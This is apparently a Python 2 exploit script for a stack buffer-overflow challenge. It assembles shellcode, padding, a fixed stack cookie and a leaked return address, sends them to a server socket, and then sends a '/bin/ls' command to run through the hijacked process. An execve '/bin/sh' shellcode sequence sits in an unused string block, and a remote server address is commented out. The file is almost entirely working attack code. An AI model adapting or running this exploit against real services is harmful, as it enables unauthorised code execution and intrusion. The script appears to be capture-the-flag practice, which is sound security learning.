#!/usr/bin/env python
import re
import struct
import sys
import socket

BUFFER_SIZE = 128
STACK_SPACE = "B"*12
BYTES_TO_PASS_RPTR = 152
BYTES_TO_COOKIE = 128

#SHELL_CODE_EXIT = "\xb0\x01\x31\xdb\xcd\x80"
#SHELL_CODE_HELLO = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"

SHELL_CODE = "\x90"*10+\
"\x31\xc0\xbb\xea\x1b\xe6\x77\x66\xb8\x88\x13\x50\xff\xd3"
""" +\
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"+\
"\x1E\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08" + \
"\x83\xC3\x04" + \
"\x89\x43\x08" + \
"\x83\xEB\x04" + \
"\xb0\x0e" +\
"\x48\x48\x48" +\
"\x8d\x4b\x08" + \
"\x83\xC3\x04" + \
"\x8d\x53\x08" + \
"\x83\xEB\x04" + \
"\xcd\x80" +\
"\xe8\xdd\xff\xff\xff"+\
"\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42"
"""
print len(SHELL_CODE)
BUF_A = "A"*(BUFFER_SIZE-len(SHELL_CODE))

def makeShellWord(number):
	return struct.pack('<I',number)

COOKIE = makeShellWord(0x475a31a5)+makeShellWord(0x40501555)

def makePayloadString(offset):
	offset = int(offset,16)
	payload_str = SHELL_CODE + BUF_A + COOKIE + STACK_SPACE
	payload_str += makeShellWord(offset)
	
	return payload_str

if __name__ == "__main__":
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#server_address = ('54.173.98.115',1259)
	server_address = ('localhost',4001)	
	sock.connect(server_address)
	data = sock.recv(64)
	print data[6::]
	payload = makePayloadString(data[6::])
	sock.sendall(payload+"\n")
	
	boolnull = False
	total = ""
	sock.sendall("/bin/ls\n")
	while not boolnull:
		temp = sock.recv(1)
		if not temp:
			boolnull = True
		else:
			total += temp
	print SHELL_CODE
	print total
	print len(total)-4
	"""
	total = total[len(payload)+5::]
	total = total[14::]
	while total.startswith("0x70257025"):
		total = total[10::]
	
	i = 0
	print total
	"""
